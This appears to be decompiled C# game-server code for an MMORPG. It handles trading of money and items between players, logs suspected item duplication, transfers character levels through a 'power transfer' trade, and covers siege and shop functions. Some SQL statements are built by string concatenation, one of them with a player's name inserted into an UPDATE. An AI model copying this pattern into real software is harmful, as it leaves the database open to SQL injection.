				if (!Playe.打开仓库中)
				{
					MainForm.WriteLine(6, "交易成功 BUG![" + Playe.Userid + "]-[" + Playe.UserName + "]");
					return;
				}
				if (!Playe.交易.交易人.打开仓库中)
				{
					MainForm.WriteLine(6, "交易成功 BUG![" + Playe.交易.交易人.Userid + "]-[" + Playe.交易.交易人.UserName + "]");
					return;
				}
				if (Playe.交易.交易物品1.Count > Playe.交易.交易人.得到包裹空位数())
				{
					MainForm.WriteLine(6, "交易成功 BUG15[" + Playe.交易.交易人.Userid + "]-[" + Playe.交易.交易人.UserName + "]");
					return;
				}
				if (Playe.交易.交易钱 <= 0)
				{
					goto IL_03fe;
				}
				if (Playe.Player_Money < Playe.交易.交易钱)
				{
					return;
				}
				if (Playe.交易.交易人.Player_Money + Playe.交易.交易钱 > World.最大钱数)
				{
					Playe.交易.交易钱 = World.最大钱数 - Playe.交易.交易人.Player_Money;
				}
				Playe.交易.交易人.Player_Money += Playe.交易.交易钱;
				Playe.交易.交易人.更新金钱和负重();
				Playe.Player_Money -= Playe.交易.交易钱;
				MainForm.WriteLine(5, "交易金钱 [" + Playe.Userid + "][" + Playe.UserName + "] 和[" + Playe.交易.交易人.Userid + "][" + Playe.交易.交易人.UserName + "](" + Playe.交易.交易钱 + ")");
				goto IL_03fe;
				IL_03fe:
				foreach (交易物品类 value2 in Playe.交易.交易物品1.Values)
				{
					物品类 物品 = value2.物品;
					int num = 得到包裹空位(Playe.交易.交易人);
					if (num == -1)
					{
						break;
					}
					物品类 物品类2 = 得到人物物品物品全局ID(Playe, 物品.Get物品全局ID);
					if (物品类2 != null)
					{
						if (!World.Itme.TryGetValue(BitConverter.ToInt32(物品类2.物品ID, 0), out var value))
						{
							break;
						}
						int fLD_SIDE = value.FLD_SIDE;
						if (value2.物品数量 < 1)
						{
							string[] array = new string[13]
							{
								"非法复制_交易22[",
								Playe.Userid,
								"]-[",
								Playe.UserName,
								"]物品名称[",
								物品类2.得到物品名称(),
								"] 物品名称2[",
								物品.得到物品名称(),
								"] 物品数量[",
								null,
								null,
								null,
								null
							};
							array[9] = BitConverter.ToInt32(物品类2.物品数量, 0).ToString();
							array[10] = "] 数量[";
							array[11] = value2.物品数量.ToString();
							array[12] = "]";
							MainForm.WriteLine(6, string.Concat(array));
							break;
						}
						if (value2.物品数量 > BitConverter.ToInt32(物品类2.物品数量, 0))
						{
							string[] array2 = new string[13]
							{
								"非法复制_交易2[",
								Playe.Userid,
								"]-[",
								Playe.UserName,
								"]物品名称[",
								物品类2.得到物品名称(),
								"] 物品名称2[",
								物品.得到物品名称(),
								"] 物品数量[",
								null,
								null,
								null,
								null
							};
							array2[9] = BitConverter.ToInt32(物品类2.物品数量, 0).ToString();
							array2[10] = "] 数量[";
							array2[11] = value2.物品数量.ToString();
							array2[12] = "]";
							MainForm.WriteLine(6, string.Concat(array2));
							break;
						}
						if (物品类2.得到物品位置类型() == 1 || 物品类2.得到物品位置类型() == 2 || 物品类2.得到物品位置类型() == 5 || 物品类2.得到物品位置类型() == 6)
						{
							if (物品类2.FLD_MAGIC1 >= 20000025)
							{
								MainForm.WriteLine(6, "交易 出现 没绑物品 [" + Playe.Userid + "][" + Playe.UserName + "] 交易物品 :[" + Playe.交易.交易人.Userid + "][" + Playe.交易.交易人.UserName + "] 物品:" + 物品类2.得到物品名称() + " 编号:" + BitConverter.ToInt32(物品类2.得到全局ID(), 0) + " 数量[" + value2.物品数量 + "] 属性:[" + 物品类2.FLD_MAGIC0 + ", " + 物品类2.FLD_MAGIC1 + ", " + 物品类2.FLD_MAGIC2 + ", " + 物品类2.FLD_MAGIC3 + ", " + 物品类2.FLD_MAGIC4 + "]");
							}
						}
						else if (物品类2.得到物品位置类型() == 4 && 物品类2.FLD_MAGIC1 >= 70000030)
						{
							MainForm.WriteLine(6, "交易 出现 没绑物品 [" + Playe.Userid + "][" + Playe.UserName + "] 交易物品 :[" + Playe.交易.交易人.Userid + "][" + Playe.交易.交易人.UserName + "] 物品:" + 物品类2.得到物品名称() + " 编号:" + BitConverter.ToInt32(物品类2.得到全局ID(), 0) + " 数量[" + value2.物品数量 + "] 属性:[" + 物品类2.FLD_MAGIC0 + ", " + 物品类2.FLD_MAGIC1 + ", " + 物品类2.FLD_MAGIC2 + ", " + 物品类2.FLD_MAGIC3 + ", " + 物品类2.FLD_MAGIC4 + "]");
						}
						MainForm.WriteLine(5, "[" + Playe.Userid + "][" + Playe.UserName + "] 交易物品 :[" + Playe.交易.交易人.Userid + "][" + Playe.交易.交易人.UserName + "] 物品:" + 物品类2.得到物品名称() + " 编号:" + BitConverter.ToInt32(物品类2.得到全局ID(), 0) + " 数量[" + value2.物品数量 + "] 属性:[" + 物品类2.FLD_MAGIC0 + ", " + 物品类2.FLD_MAGIC1 + ", " + 物品类2.FLD_MAGIC2 + ", " + 物品类2.FLD_MAGIC3 + ", " + 物品类2.FLD_MAGIC4 + "]");
						if (fLD_SIDE == 0 && value2.物品数量 > 1)
						{
							string[] array3 = new string[13]
							{
								"非法复制_交易1[",
								Playe.Userid,
								"]-[",
								Playe.UserName,
								"]物品名称[",
								物品类2.得到物品名称(),
								"] 物品名称2[",
								物品.得到物品名称(),
								"] 物品数量[",
								null,
								null,
								null,
								null
							};
							array3[9] = BitConverter.ToInt32(物品类2.物品数量, 0).ToString();
							array3[10] = "] 数量[";
							array3[11] = value2.物品数量.ToString();
							array3[12] = "]";
							MainForm.WriteLine(6, string.Concat(array3));
							break;
						}
						string userid = Playe.Userid;
						string userName = Playe.UserName;
						string userid2 = Playe.交易.交易人.Userid;
						string userName2 = Playe.交易.交易人.UserName;
						double 全局ID = BitConverter.ToInt64(物品类2.物品全局ID, 0);
						int 物品ID = BitConverter.ToInt32(物品类2.物品ID, 0);
						string 物品名 = 物品类2.得到物品名称();
						int 物品数量 = value2.物品数量;
						string 物品属性 = 物品类2.FLD_MAGIC0 + "-" + 物品类2.FLD_MAGIC1 + "-" + 物品类2.FLD_MAGIC2 + "-" + 物品类2.FLD_MAGIC3 + "-" + 物品类2.FLD_MAGIC4 + "初" + 物品类2.FLD_FJ_觉醒 + "中" + 物品类2.FLD_FJ_中级附魂 + "进" + 物品类2.FLD_FJ_进化;
						RxjhClass.物品记录(userid, userName, userid2, userName2, 全局ID, 物品ID, 物品名, 物品数量, 物品属性, 0, "交易");
						物品类2.FLD_FJ_NJ = 0;
						if (是否灵兽(BitConverter.ToInt32(物品类2.物品ID, 0)))
						{
							DBA.ExeSqlCommand(string.Format("UPDATE TBL_XWWL_Cw SET ZrName='{1}', FLD_ZCD={2} WHERE ItmeId={0}", BitConverter.ToInt64(物品类2.物品全局ID, 0), Playe.交易.交易人.UserName, 0));
						}
						Playe.交易.交易人.增加物品(物品类2.物品全局ID, 物品类2.物品ID, num, BitConverter.GetBytes(value2.物品数量), 物品类2.物品属性);
						Playe.减去物品(物品类2.物品位置, value2.物品数量);
						continue;
					}
					string[] array4 = new string[13]
					{
						"非法复制_交易3[",
						Playe.Userid,
						"]-[",
						Playe.UserName,
						"]物品名称[",
						物品类2.得到物品名称(),
						"] 物品名称2[",
						物品.得到物品名称(),
						"] 物品数量[",
						null,
						null,
						null,
						null
					};
					array4[9] = BitConverter.ToInt32(物品类2.物品数量, 0).ToString();
					array4[10] = "] 数量[";
					array4[11] = BitConverter.ToInt32(物品.物品数量, 0).ToString();
					array4[12] = "]";
					MainForm.WriteLine(6, string.Concat(array4));
					break;
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "交易成功出错 [" + Playe.Userid + "][" + Playe.UserName + "][" + Playe.Client.ToString() + "]和[" + Playe.交易.交易人.Userid + "][" + Playe.交易.交易人.UserName + "][" + Playe.交易.交易人.Client.ToString() + "] " + ex);
			}
		}

		public void 交易放东西(byte[] 封包数据, int length)
		{
			if (!打开仓库中)
			{
				MainForm.WriteLine(6, "交易放东西 BUG![" + base.Userid + "]-[" + base.UserName + "]");
				return;
			}
			try
			{
				封包修改(封包数据, length);
				byte[] dst = new byte[World.数据库单个物品大小];
				byte[] array = new byte[8];
				byte[] array2 = new byte[4];
				byte[] array3 = new byte[8];
				Buffer.BlockCopy(封包数据, 22, dst, 0, 16);
				Buffer.BlockCopy(封包数据, 42, dst, 16, World.物品属性大小);
				Buffer.BlockCopy(封包数据, 22, array, 0, 8);
				Buffer.BlockCopy(封包数据, 34, array2, 0, 4);
				Buffer.BlockCopy(封包数据, 42, array3, 0, 8);
				if (BitConverter.ToInt64(array3, 0) < 1 || !World.Itme.TryGetValue(BitConverter.ToInt32(array2, 0), out var value) || value.FLD_QUESTITEM == 1)
				{
					return;
				}
				if (value.FLD_LOCK == 1 && GM模式 != 8)
				{
					系统提示("[百宝阁]锁定的物品禁止交易。");
				}
				else
				{
					if (BitConverter.ToInt32(array2, 0) == 2000000000)
					{
						long num = BitConverter.ToInt64(array3, 0);
						if (num <= 0 || num > World.最大钱数 || num > base.Player_Money || num + 交易.交易钱 > base.Player_Money)
						{
							return;
						}
						if (交易.交易人.Player_Money + num > World.最大钱数)
						{
							系统提示("对方随身携带总额已超过[" + World.最大钱数 / 100000000 + "亿]两。");
							return;
						}
						交易.交易钱 += num;
						byte[] array4 = Converter.hexStringToByte("AA55760098009A00680001000000010000000000000000000000000000000000000000943577000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000CD055AA");
						Buffer.BlockCopy(BitConverter.GetBytes(num), 0, array4, 42, 8);
						Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array4, 4, 2);
						if (base.Client != null)
						{
							base.Client.Send多包(array4, array4.Length);
						}
						if (交易.交易人.Client != null)
						{
							交易.交易人.Client.Send多包(array4, array4.Length);
						}
						return;
					}
					if (BitConverter.ToInt64(array, 0) == 0)
					{
						return;
					}
					物品类 物品类2 = 得到人物物品物品全局ID(this, BitConverter.ToInt64(array, 0));
					if (物品类2 == null || 物品类2.物品绑定 || 交易.交易物品1.ContainsKey(BitConverter.ToInt64(array, 0)))
					{
						return;
					}
					交易物品类 交易物品类2 = new 交易物品类
					{
						物品 = 物品类2,
						物品数量 = BitConverter.ToInt32(array3, 0)
					};
					if (交易物品类2.物品数量 >= 1)
					{
						交易.交易物品1.TryAdd(BitConverter.ToInt64(array, 0), 交易物品类2);
						byte[] array5 = Converter.hexStringToByte("AA55760094029A0068000100000001000000000000008716E56781832006000000000208AF2F000000000100000000000000470D03000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000CD055AA");
						Buffer.BlockCopy(物品类2.物品_byte, 0, array5, 22, 8);
						Buffer.BlockCopy(物品类2.物品_byte, 8, array5, 34, 4);
						Buffer.BlockCopy(array3, 0, array5, 42, 8);
						Buffer.BlockCopy(物品类2.物品_byte, 16, array5, 50, World.物品属性大小);
						Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array5, 4, 2);
						if (base.Client != null)
						{
							base.Client.Send(array5, array5.Length);
						}
						if (交易.交易人.Client != null)
						{
							交易.交易人.Client.Send多包(array5, array5.Length);
						}
						if (是否灵兽(BitConverter.ToInt32(array2, 0)))
						{
							发送灵兽数据((int)BitConverter.ToInt64(array, 0));
							交易.交易人.发送灵兽数据((int)BitConverter.ToInt64(array, 0));
						}
					}
					return;
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "交易放东西出错 [" + base.Userid + "][" + base.UserName + "][" + base.Client.ToString() + "] " + ex);
			}
		}

		public void 交易大类(byte[] 封包数据, int length)
		{
			try
			{
				封包修改(封包数据, length);
				if (base.Player_Level < 15)
				{
					系统提示("人物级别小于" + 15 + "不允许进行交易。", 50, "系统提示");
					return;
				}
				if (World.当前是否是银币线路 == 1)
				{
					系统提示("当前线路不能交易！", 50, "系统提示");
					return;
				}
				byte[] array = new byte[4];
				byte[] array2 = new byte[4];
				Buffer.BlockCopy(封包数据, 18, array, 0, 4);
				Buffer.BlockCopy(封包数据, 10, array2, 0, 4);
				int num = BitConverter.ToInt32(array, 0);
				int num2 = BitConverter.ToInt32(array2, 0);
				交易人物ID = num;
				交易操作ID = num2;
				switch (num2)
				{
				case 1:
					发送交易请求(152, num, num2);
					break;
				case 2:
					if (!打开仓库中)
					{
						接受交易请求(152, num2);
					}
					break;
				case 3:
					对方取消交易请求(152, num, num2);
					break;
				case 4:
					本人取消交易请求(152, num, num2);
					break;
				case 5:
					if (安全码是否通过验证)
					{
						同意接受(152, num, num2);
					}
					else
					{
						发送安全码消息(1);
					}
					break;
				case 6:
					关闭交易(152, num, num2);
					break;
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "交易大类出错 [" + base.Userid + "][" + base.UserName + "][" + base.Client.ToString() + "] " + ex);
			}
		}

		public void 同意接受(int 包ID, int 人物的ID, int 操作ID)
		{
			try
			{
				if (退出中)
				{
					return;
				}
				byte[] array = Converter.hexStringToByte("AA55420000009800340001000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000055AA");
				Buffer.BlockCopy(BitConverter.GetBytes(包ID), 0, array, 6, 2);
				Buffer.BlockCopy(BitConverter.GetBytes(操作ID), 0, array, 10, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(操作ID), 0, array, 14, 4);
				byte[] bytes = Encoding.Default.GetBytes(base.UserName);
				Buffer.BlockCopy(bytes, 0, array, 22, bytes.Length);
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 18, 2);
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
				if (base.Client != null)
				{
					base.Client.Send多包(array, array.Length);
				}
				if (交易.交易人.Client != null)
				{
					交易.交易人.Client.Send多包(array, array.Length);
				}
				交易.交易接受 = true;
				Players 交易人 = 交易.交易人;
				if (交易.交易人.交易.交易接受)
				{
					if (!交易.交易人.Client.Running)
					{
						return;
					}
					if (包ID == 5663)
					{
						物品类 物品类2 = 得到人物物品类型(1008000130);
						if (物品类2 != null)
						{
							交易成功(this);
							物品使用(1, 物品类2.物品位置, 1);
							传功转移人物数据(this, 交易.交易人);
							交易.交易物品1.Clear();
							更新金钱和负重();
							保存人物数据存储过程();
							交易.交易人.保存人物数据存储过程();
							交易.交易人.交易.交易物品1.Clear();
							交易.交易人.更新金钱和负重();
							打开仓库中 = false;
							交易.交易人.打开仓库中 = false;
							交易.关闭交易();
							退回人物列表();
							交易人.退回人物列表();
						}
					}
					else
					{
						交易成功(this);
						交易.交易物品1.Clear();
						更新金钱和负重();
						交易成功(交易.交易人);
						保存人物数据存储过程();
						交易.交易人.保存人物数据存储过程();
						交易.交易人.交易.交易物品1.Clear();
						交易.交易人.更新金钱和负重();
						打开仓库中 = false;
						交易.交易人.打开仓库中 = false;
						交易.关闭交易();
					}
					return;
				}
				MainForm.WriteLine(5, "[" + base.Userid + "][" + base.UserName + "] 交易就绪 [" + 交易.交易人.Userid + "][" + 交易.交易人.UserName + "]");
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "同意接受出错 [" + base.Userid + "][" + base.UserName + "][" + base.Client.ToString() + "] " + ex);
			}
		}

		public void 传功转移人物数据(Players PlaySend, Players PlayAccept)
		{
			if (PlaySend != null && PlayAccept != null)
			{
				PlayAccept.Player_Level = PlaySend.Player_Level;
				PlayAccept.Player_ExpErience = PlaySend.Player_ExpErience;
				PlayAccept.Player_WuXun = PlaySend.Player_WuXun;
				PlayAccept.人物善恶 = PlaySend.人物善恶;
				PlayAccept.人物经验 = PlaySend.人物经验;
				PlayAccept.人物轻功 = PlaySend.人物轻功;
				PlayAccept.称号积分 = PlaySend.称号积分;
				PlayAccept.任务.Clear();
				PlaySend.任务.Clear();
				PlaySend.Player_Level = 1;
				PlaySend.Player_Job_leve = 0;
				PlaySend.Player_ExpErience = 0;
				PlaySend.Player_WuXun = 0;
				PlaySend.人物善恶 = 0;
				PlaySend.人物经验 = 100L;
				PlaySend.人物轻功 = 0;
				PlaySend.Player_Zx = 0;
				PlaySend.称号积分 = 0;
			}
		}

		public void 退回人物列表()
		{
			人物是否登陆 = false;
			退出中 = true;
			Logout();
			string hex = "AA5516000C03630008000100000000000001000000000000000055AA";
			byte[] array = Converter.hexStringToByte("AA5512000C035700040004000000000000000000000055AA");
			byte[] array2 = Converter.hexStringToByte(hex);
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array2, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
			if (base.Client != null)
			{
				base.Client.Send(array2, array2.Length);
			}
		}

		public void 关闭交易(int 包ID, int 人物的ID, int 操作ID)
		{
			try
			{
				byte[] array = Converter.hexStringToByte("AA55420000009800340001000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000055AA");
				Buffer.BlockCopy(BitConverter.GetBytes(包ID), 0, array, 6, 2);
				Buffer.BlockCopy(BitConverter.GetBytes(操作ID), 0, array, 10, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(操作ID), 0, array, 14, 4);
				byte[] bytes = Encoding.Default.GetBytes(base.UserName);
				Buffer.BlockCopy(bytes, 0, array, 22, bytes.Length);
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 18, 2);
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
				if (base.Client != null)
				{
					base.Client.Send(array, array.Length);
				}
				if (交易.交易人.Client != null)
				{
					交易.交易人.Client.Send(array, array.Length);
				}
				if (包ID == 5663)
				{
					隔体传功_特效(交易.交易人, 取消: true);
				}
				交易.关闭交易();
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "关闭交易出错 [" + base.Userid + "][" + base.UserName + "][" + base.Client.ToString() + "] " + ex);
			}
		}

		public void 隔体传功_特效(Players to, bool 取消)
		{
			using 发包类 发包类 = new 发包类();
			发包类.Write4(取消 ? 4 : 0);
			发包类.Write4(to.人物全服ID);
			发包类.Write(to.人物坐标_X);
			发包类.Write(15f);
			发包类.Write(to.人物坐标_Y);
			发包类.Write4(base.人物全服ID);
			发包类.Write(base.人物坐标_X);
			发包类.Write(15f);
			发包类.Write(base.人物坐标_Y);
			base.Client.SendPak(发包类, 8214, base.人物全服ID);
			to.Client.SendPak(发包类, 8214, base.人物全服ID);
			发包类.m_Stream.Position = 0L;
			发包类.Write4((!取消) ? 1 : 4);
			发包类.Write4(base.人物全服ID);
			发包类.Write(base.人物坐标_X);
			发包类.Write(15f);
			发包类.Write(base.人物坐标_Y);
			发包类.Write4(to.人物全服ID);
			发包类.Write(to.人物坐标_X);
			发包类.Write(15f);
			发包类.Write(to.人物坐标_Y);
			base.Client.SendPak(发包类, 8214, base.人物全服ID);
			to.Client.SendPak(发包类, 8214, base.人物全服ID);
		}

		public void 接受交易请求(int 包ID, int 操作ID)
		{
			try
			{
				byte[] array = Converter.hexStringToByte("AA55420000009800340001000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000055AA");
				Buffer.BlockCopy(BitConverter.GetBytes(包ID), 0, array, 6, 2);
				Buffer.BlockCopy(BitConverter.GetBytes(操作ID), 0, array, 10, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(操作ID), 0, array, 14, 4);
				byte[] bytes = Encoding.Default.GetBytes(交易.交易人.UserName);
				Buffer.BlockCopy(bytes, 0, array, 22, bytes.Length);
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
				Buffer.BlockCopy(BitConverter.GetBytes(交易.交易人.Player_Job), 0, array, 59, 1);
				Buffer.BlockCopy(BitConverter.GetBytes(交易.交易人.Player_Job_leve), 0, array, 60, 1);
				Buffer.BlockCopy(BitConverter.GetBytes(交易.交易人.Player_Zx), 0, array, 61, 1);
				if (交易.交易人.帮派名字 != "")
				{
					byte[] bytes2 = Encoding.Default.GetBytes(交易.交易人.帮派名字);
					Buffer.BlockCopy(bytes2, 0, array, 43, bytes2.Length);
				}
				if (base.Client != null)
				{
					base.Client.Send(array, array.Length);
				}
				交易.交易中 = true;
				交易.交易人.交易.交易中 = true;
				打开仓库中 = true;
				交易.交易人.打开仓库中 = true;
				打开仓库中 = true;
				交易.交易人.打开仓库中 = true;
				byte[] bytes3 = Encoding.Default.GetBytes(base.UserName);
				byte[] array2 = new byte[15];
				Buffer.BlockCopy(bytes3, 0, array2, 0, bytes3.Length);
				Buffer.BlockCopy(array2, 0, array, 22, array2.Length);
				Buffer.BlockCopy(BitConverter.GetBytes(交易.交易人.人物全服ID), 0, array, 4, 2);
				Buffer.BlockCopy(BitConverter.GetBytes(base.Player_Job), 0, array, 59, 1);
				Buffer.BlockCopy(BitConverter.GetBytes(base.Player_Job_leve), 0, array, 60, 1);
				Buffer.BlockCopy(BitConverter.GetBytes(base.Player_Zx), 0, array, 61, 1);
				if (base.帮派名字 != "")
				{
					byte[] bytes4 = Encoding.Default.GetBytes(base.帮派名字);
					Buffer.BlockCopy(bytes4, 0, array, 43, bytes4.Length);
				}
				if (交易.交易人.Client != null)
				{
					交易.交易人.Client.Send多包(array, array.Length);
				}
				if (包ID == 5663)
				{
					隔体传功_特效(交易.交易人, 取消: false);
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "接受交易请求出错[" + base.Userid + "][" + base.UserName + "][" + base.Client.ToString() + "] " + ex);
			}
		}

		public void 对方取消交易请求(int 包ID, int 人物的ID, int 操作ID)
		{
			try
			{
				byte[] array = Converter.hexStringToByte("AA55420000009800340001000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000055AA");
				Buffer.BlockCopy(BitConverter.GetBytes(包ID), 0, array, 6, 2);
				Buffer.BlockCopy(BitConverter.GetBytes(操作ID), 0, array, 10, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(操作ID), 0, array, 14, 4);
				byte[] bytes = Encoding.Default.GetBytes(base.UserName);
				Buffer.BlockCopy(bytes, 0, array, 22, bytes.Length);
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 18, 2);
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
				if (base.Client != null)
				{
					base.Client.Send(array, array.Length);
				}
				if (交易.交易人.Client != null)
				{
					交易.交易人.Client.Send多包(array, array.Length);
				}
				if (包ID == 5663)
				{
					隔体传功_特效(交易.交易人, 取消: true);
				}
				交易.关闭交易();
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "对方取消交易请求出错 [" + base.Userid + "][" + base.UserName + "][" + base.Client.ToString() + "] " + ex.Message);
			}
		}

		public void 本人取消交易请求(int 包ID, int 人物的ID, int 操作ID)
		{
			try
			{
				byte[] array = Converter.hexStringToByte("AA55420000009800340001000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000055AA");
				if (包ID == 152)
				{
					Buffer.BlockCopy(BitConverter.GetBytes(6), 0, array, 10, 4);
					Buffer.BlockCopy(BitConverter.GetBytes(6), 0, array, 14, 4);
				}
				else
				{
					Buffer.BlockCopy(BitConverter.GetBytes(操作ID), 0, array, 10, 4);
					Buffer.BlockCopy(BitConverter.GetBytes(操作ID), 0, array, 14, 4);
				}
				byte[] bytes = Encoding.Default.GetBytes(base.UserName);
				Buffer.BlockCopy(BitConverter.GetBytes(包ID), 0, array, 6, 2);
				Buffer.BlockCopy(bytes, 0, array, 23, bytes.Length);
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 18, 2);
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
				if (base.Client != null)
				{
					base.Client.Send(array, array.Length);
				}
				if (交易.交易人.Client != null)
				{
					交易.交易人.Client.Send多包(array, array.Length);
				}
				if (包ID == 5663)
				{
					隔体传功_特效(交易.交易人, 取消: true);
				}
				交易.关闭交易();
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "本人取消交易请求出错 [" + base.Userid + "][" + base.UserName + "][" + base.Client.ToString() + "] " + ex.Message);
			}
		}

		public void 发送交易请求(int 包ID, int 人物的ID, int 操作ID)
		{
			try
			{
				if (退出中 || 进店中 || 打开仓库中 || 人物的ID == base.人物全服ID || base.Player死亡 || base.人物_HP <= 0 || (个人商店 != null && 个人商店.个人商店是否开启) || (交易 != null && 交易.交易人 != null))
				{
					return;
				}
				byte[] array = Converter.hexStringToByte("AA55420000009800340001000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000055AA");
				Buffer.BlockCopy(BitConverter.GetBytes(包ID), 0, array, 6, 2);
				Players players = 得到人物数据(人物的ID);
				if (players == null || players.退出中 || players.打开仓库中 || players.进店中 || players.Player死亡 || players.人物_HP <= 0 || (players.个人商店 != null && players.个人商店.个人商店是否开启) || (players.交易 != null && players.交易.交易人 != null))
				{
					return;
				}
				if (players.Config.交易 == 0)
				{
					系统提示("对方设置不容许交易。");
					return;
				}
				if (包ID != 5663)
				{
					goto IL_0299;
				}
				if (players.Player_Level > base.Player_Level)
				{
					系统提示("对方等级高于自身级别, 不能使用隔体传功。", 50, "系統提示");
					return;
				}
				if (players.组队id != 0)
				{
					系统提示("对方组队中, 不能使用隔体传功。", 50, "系統提示");
					return;
				}
				if (players.帮派Id != 0)
				{
					系统提示("对方还没退出帮派, 不能使用隔体传功。", 50, "系統提示");
					return;
				}
				for (int i = 0; i < 16; i++)
				{
					if (players.装备栏已穿装备[i].Get物品ID > 0)
					{
						系统提示("对方身上穿戴装备, 请先脱下装备。", 50, "系統提示");
						return;
					}
				}
				if (组队id != 0)
				{
					系统提示("组队中, 不能使用隔体传功。", 50, "系統提示");
					return;
				}
				if (base.帮派Id != 0)
				{
					系统提示("需退出帮派才能使用隔体传功。", 50, "系統提示");
					return;
				}
				for (int j = 0; j < 16; j++)
				{
					if (装备栏已穿装备[j].Get物品ID > 0)
					{
						系统提示("身上穿戴装备, 不能使用隔体传功。", 50, "系統提示");
						return;
					}
				}
				goto IL_0299;
				IL_0299:
				交易 = new 交易类(players);
				players.交易 = new 交易类(this);
				Buffer.BlockCopy(BitConverter.GetBytes(操作ID), 0, array, 10, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(操作ID), 0, array, 14, 4);
				if (包ID == 152)
				{
					Buffer.BlockCopy(BitConverter.GetBytes(players.人物全服ID), 0, array, 18, 4);
					byte[] bytes = Encoding.Default.GetBytes(base.UserName);
					Buffer.BlockCopy(bytes, 0, array, 22, bytes.Length);
					Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
					if (players.Client != null)
					{
						players.Client.Send多包(array, array.Length);
					}
					if (base.Client != null)
					{
						base.Client.Send多包(array, array.Length);
					}
				}
				else
				{
					Buffer.BlockCopy(BitConverter.GetBytes(players.人物全服ID), 0, array, 18, 4);
					byte[] bytes2 = Encoding.Default.GetBytes(base.UserName);
					Buffer.BlockCopy(bytes2, 0, array, 22, bytes2.Length);
					Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
					if (players.Client != null)
					{
						players.Client.Send多包(array, array.Length);
					}
					if (base.Client != null)
					{
						base.Client.Send多包(array, array.Length);
					}
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "请求交易出错 [" + base.Userid + "][" + base.UserName + "][" + base.Client.ToString() + "] " + ex.Message);
			}
		}

		public void 参加攻城战()
		{
			try
			{
				if (World.SiegeWar == null)
				{
					系统提示("攻城没有开启无法参加!每周日19.10开放攻城！", 9, "系统提示");
					return;
				}
				if (base.门派联盟盟主 == string.Empty)
				{
					系统提示("你还没加入同盟门派，请加入同盟门派再来参加！", 9, "系统提示");
					return;
				}
				DataTable dBToDataTable = DBA.GetDBToDataTable("select * from [攻城城主] where 分区信息='" + World.ZoneNumber + "'");
				if (dBToDataTable.Rows[0]["攻城行会名"].ToString() == base.帮派名字)
				{
					World.申请攻城人物列表.Add(this);
					天魔移动(-427f, -13f, 15f, 42001);
				}
				else
				{
					World.申请攻城人物列表.Add(this);
					天魔移动(-431f, -681f, 15f, 42001);
				}
				dBToDataTable.Dispose();
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "申请攻城战 出错：" + ex);
			}
		}

		private void 打开商店(int 商店ID_, int 操作ID_, int 页标_)
		{
			try
			{
				base.当前操作NPC = 商店ID_;
				base.当前操作类型 = 操作ID_;
				byte[] array = new byte[2];
				byte[] array2 = new byte[2];
				byte[] dst = new byte[2];
				Buffer.BlockCopy(BitConverter.GetBytes(页标_), 0, dst, 0, 2);
				Buffer.BlockCopy(BitConverter.GetBytes(商店ID_), 0, array, 0, 2);
				Buffer.BlockCopy(BitConverter.GetBytes(操作ID_), 0, array2, 0, 2);
				byte[] array3 = Converter.hexStringToByte("AA551E0000009100100001000000010000000100000000000000000000000000000055AA");
				switch (操作ID_)
				{
				case 195:
					打开仓库中 = false;
					Buffer.BlockCopy(BitConverter.GetBytes(1010), 0, array3, 18, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
					if (World.门战占领者 == string.Empty)
					{
						系统提示("上一句门战无人参加或者平局...", 3, "系统提示");
					}
					else
					{
						系统提示("≮" + World.门战占领者 + "≯是上一句胜利门派.胜利门派无法连续参加门战...", 3, "系统提示");
					}
					break;
				case 49:
				{
					打开仓库中 = false;
					Buffer.BlockCopy(BitConverter.GetBytes(1010), 0, array3, 18, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
					TeamClass value;
